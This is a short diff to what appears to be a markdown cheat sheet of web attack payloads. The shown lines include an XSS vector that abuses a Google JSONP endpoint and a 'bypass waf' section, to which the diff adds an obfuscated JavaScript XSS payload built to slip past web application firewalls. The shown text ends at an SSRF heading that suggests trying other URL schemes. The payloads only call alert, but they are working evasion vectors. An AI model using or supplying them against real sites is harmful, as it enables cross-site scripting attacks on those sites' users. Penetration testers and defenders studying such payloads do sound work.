@@ -120,6 +120,7 @@ www.google.com/complete/search?client=chrome&q=1&jsonp=alert(1)//
 10-bypass waf
 ```
 alert?.(1)
+window&&=(window&&=opener||=alert)?.(1??0,)
 ```
 # SSRF
 1-Try other URL schemes:<br>
